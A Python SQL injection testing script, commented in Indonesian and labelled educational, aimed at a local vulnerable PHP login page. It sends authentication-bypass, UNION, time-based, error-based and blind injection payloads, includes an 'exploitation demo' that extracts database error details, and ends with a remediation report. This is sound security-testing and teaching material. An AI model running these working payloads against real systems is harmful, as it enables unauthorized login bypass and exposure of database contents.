#!/usr/bin/env python3
"""
SQL Injection Testing Script
Educational Purpose: Demonstrasi SQL injection pada aplikasi vulnerable
"""

import requests
import time
import re

def test_sql_injection_detailed():
    """
    Testing SQL injection dengan berbagai payload
    """
    print("💉 SQL INJECTION TESTING SUITE")
    print("=" * 50)
    
    base_url = "http://localhost:8081"
    
    # SQL injection payloads untuk authentication bypass
    payloads = {
        "Comment Injection": [
            "admin'--",
            "admin'#", 
            "admin'/*"
        ],
        "Boolean-based": [
            "' OR '1'='1'--",
            "' OR 1=1--",
            "' OR 'a'='a'--",
            "admin' OR '1'='1'--",
            "' OR '1'='1'#"
        ],
        "Union-based": [
            "' UNION SELECT 1,'admin','password',1--",
            "' UNION SELECT NULL,'admin','admin',1--",
            "' UNION ALL SELECT 1,2,3,4--"
        ],
        "Time-based": [
            "' OR SLEEP(5)--",
            "admin'; WAITFOR DELAY '00:00:05'--"
        ],
        "Error-based": [
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"
        ]
    }
    
    results = {}
    
    for category, payload_list in payloads.items():
        print(f"\n🎯 Testing {category} SQL Injection")
        print("-" * 40)
        
        category_results = []
        
        for payload in payload_list:
            print(f"🔍 Testing: {payload}")
            
            # Test in username field
            login_data = {
                'username': payload,
                'password': 'test'
            }
            
            try:
                start_time = time.time()
                response = requests.post(
                    f"{base_url}/index.php", 
                    data=login_data, 
                    timeout=10
                )
                end_time = time.time()
                response_time = end_time - start_time
                
                # Analyze response
                analysis = analyze_sql_response(response, payload, response_time)
                category_results.append(analysis)
                
                # Print immediate results
                if analysis['vulnerability_detected']:
                    print(f"   🚨 VULNERABILITY: {analysis['type']}")
                    if analysis['details']:
                        print(f"   📋 Details: {analysis['details'][:100]}...")
                else:
                    print(f"   ✅ No obvious vulnerability")
                
                time.sleep(0.5)  # Rate limiting
                
            except requests.exceptions.Timeout:
                print(f"   ⏱️  TIMEOUT - Possible time-based injection")
                category_results.append({
                    'payload': payload,
                    'vulnerability_detected': True,
                    'type': 'Time-based SQL Injection',
                    'details': 'Request timed out - possible SLEEP() injection'
                })
            except Exception as e:
                print(f"   ❌ Error: {e}")
                category_results.append({
                    'payload': payload,
                    'vulnerability_detected': False,
                    'type': 'Error',
                    'details': str(e)
                })
        
        results[category] = category_results
    
    return results

def analyze_sql_response(response, payload, response_time):
    """
    Analisis response untuk mendeteksi SQL injection
    """
    analysis = {
        'payload': payload,
        'vulnerability_detected': False,
        'type': 'No vulnerability',
        'details': '',
        'response_time': response_time
    }
    
    response_text = response.text.lower()
    
    # 1. Check for SQL errors
    sql_errors = [
        'mysql', 'sql syntax', 'sqlstate', 'pdoexception',
        'ora-', 'pg_', 'odbc', 'jdbc', 'sqlite',
        'database error', 'mysql_fetch', 'ora-00921'
    ]
    
    for error in sql_errors:
        if error in response_text:
            analysis['vulnerability_detected'] = True
            analysis['type'] = 'Error-based SQL Injection'
            analysis['details'] = f"SQL error detected: {error}"
            return analysis
    
    # 2. Check for successful login bypass
    if any(success in response_text for success in ['login successful', 'welcome', 'dashboard']):
        analysis['vulnerability_detected'] = True
        analysis['type'] = 'Authentication Bypass'
        analysis['details'] = 'Successfully bypassed authentication'
        return analysis
    
    # 3. Check for time-based injection
    if response_time > 4.0:  # Assuming SLEEP(5) payload
        analysis['vulnerability_detected'] = True
        analysis['type'] = 'Time-based SQL Injection'
        analysis['details'] = f'Response time: {response_time:.2f}s (expected ~5s for SLEEP injection)'
        return analysis
    
    # 4. Check for different error patterns
    if response.status_code == 500:
        analysis['vulnerability_detected'] = True
        analysis['type'] = 'Server Error'
        analysis['details'] = 'HTTP 500 error - possible SQL error'
        return analysis
    
    # 5. Check for UNION injection success
    if 'union' in payload.lower() and len(response_text) != len(requests.post("http://localhost:8081/index.php", data={'username': 'test', 'password': 'test'}).text):
        analysis['vulnerability_detected'] = True
        analysis['type'] = 'Union-based SQL Injection'
        analysis['details'] = 'Different response length with UNION payload'
    
    return analysis

def demonstrate_sql_exploitation():
    """
    Demonstrasi eksploitasi SQL injection yang berhasil
    """
    print("\n💀 SQL INJECTION EXPLOITATION DEMO")
    print("=" * 50)
    
    # Payload yang tadi berhasil menghasilkan error
    exploit_payload = "admin'--"
    
    print(f"🎯 Using payload: {exploit_payload}")
    
    login_data = {
        'username': exploit_payload,
        'password': 'anything'
    }
    
    try:
        response = requests.post(
            "http://localhost:8081/index.php", 
            data=login_data
        )
        
        print(f"📡 Response Status: {response.status_code}")
        
        # Extract specific error information
        if 'pdoexception' in response.text.lower():
            # Extract PDO error details
            error_match = re.search(r'PDOException.*?in /var/www/html/.*?</b>', response.text, re.IGNORECASE | re.DOTALL)
            if error_match:
                print(f"🚨 PDO Exception detected:")
                print(f"   {error_match.group(0)}")
        
        # Look for database structure information
        if 'sqlstate' in response.text.lower():
            print("🔍 SQLSTATE error code found - database type identified")
        
        if 'mysql' in response.text.lower():
            print("🔍 MySQL database detected")
        
        return True
        
    except Exception as e:
        print(f"❌ Exploitation failed: {e}")
        return False

def test_blind_sql_injection():
    """
    Test blind SQL injection techniques
    """
    print("\n👁️ BLIND SQL INJECTION TESTING")
    print("=" * 40)
    
    # Test conditional responses
    true_payload = "admin' AND '1'='1'--"
    false_payload = "admin' AND '1'='2'--"
    
    print("🔍 Testing conditional responses...")
    
    # Get baseline response
    baseline_response = requests.post(
        "http://localhost:8081/index.php",
        data={'username': 'admin', 'password': 'wrong'}
    )
    baseline_length = len(baseline_response.text)
    
    # Test true condition
    true_response = requests.post(
        "http://localhost:8081/index.php",
        data={'username': true_payload, 'password': 'test'}
    )
    
    # Test false condition
    false_response = requests.post(
        "http://localhost:8081/index.php",
        data={'username': false_payload, 'password': 'test'}
    )
    
    print(f"📏 Baseline response length: {baseline_length}")
    print(f"📏 True condition length: {len(true_response.text)}")
    print(f"📏 False condition length: {len(false_response.text)}")
    
    # Check for differences
    if len(true_response.text) != len(false_response.text):
        print("🚨 BLIND SQL INJECTION DETECTED!")
        print("   Different response lengths indicate conditional vulnerability")
        return True
    else:
        print("✅ No obvious blind SQL injection detected")
        return False

def generate_sql_report(results):
    """
    Generate comprehensive SQL injection report
    """
    print("\n" + "=" * 60)
    print("📋 SQL INJECTION VULNERABILITY REPORT")
    print("=" * 60)
    
    total_vulnerabilities = 0
    vulnerable_categories = []
    
    for category, tests in results.items():
        vulnerable_tests = [test for test in tests if test['vulnerability_detected']]
        
        if vulnerable_tests:
            total_vulnerabilities += len(vulnerable_tests)
            vulnerable_categories.append(category)
            
            print(f"\n🔴 {category}: {len(vulnerable_tests)} vulnerabilities")
            for test in vulnerable_tests:
                print(f"   • {test['type']}: {test['payload']}")
    
    if total_vulnerabilities == 0:
        print("\n✅ No SQL injection vulnerabilities detected")
    else:
        print(f"\n📊 SUMMARY:")
        print(f"   Total SQL injection vulnerabilities: {total_vulnerabilities}")
        print(f"   Vulnerable categories: {', '.join(vulnerable_categories)}")
        
        print(f"\n🛡️  IMMEDIATE ACTIONS REQUIRED:")
        print("   1. Use parameterized queries/prepared statements")
        print("   2. Implement input validation and sanitization")
        print("   3. Apply principle of least privilege to database accounts")
        print("   4. Enable SQL query logging for monitoring")
        print("   5. Implement Web Application Firewall (WAF)")

if __name__ == "__main__":
    print("💉 BROKEN AUTHENTICATION - SQL INJECTION TESTING")
    print("=" * 60)
    print("⚠️  WARNING: Educational purpose only!")
    print("=" * 60)
    
    # Run comprehensive SQL injection tests
    results = test_sql_injection_detailed()
    
    # Demonstrate specific exploitation
    print("\n" + "⏸️ " * 20)
    input("Press Enter to continue to exploitation demo...")
    
    demonstrate_sql_exploitation()
    
    # Test blind SQL injection
    test_blind_sql_injection()
    
    # Generate report
    generate_sql_report(results)